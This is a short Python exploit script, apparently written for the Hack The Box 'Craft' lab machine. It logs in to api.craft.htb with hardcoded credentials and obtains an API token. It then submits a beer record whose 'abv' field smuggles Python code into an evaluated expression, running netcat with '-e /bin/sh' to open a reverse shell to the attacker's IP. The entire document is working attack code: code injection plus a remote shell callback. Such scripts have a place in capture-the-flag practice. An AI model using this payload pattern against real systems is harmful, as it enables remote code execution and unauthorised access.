#!/usr/bin/python3

import requests
import json
import os

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'User-Agent': 'Mozilla', 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
json_response = json.loads(response.text)
if json_response['message'] == "Token is valid!":
    print('Valid token found: ' + token)


# Injection
command = "__import__('os').system('nc -nv 10.10.14.3 6789 -e /bin/sh -i')"
data = {
    "name":"Evil beer",
    "brewer":"Bad People Brewery",
    "style":"FCK",
    "abv": command + ' or 5'
    #"abv": "5"
}
#response = requests.post('http://127.0.0.1:666', headers=headers, json=data, verify=False)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, json=data, verify=False, proxies={'https': 'https://127.0.0.1:8080'})
json_response = json.loads(response.text)
print(json_response)

print("Payload sent, did you get a shell?")
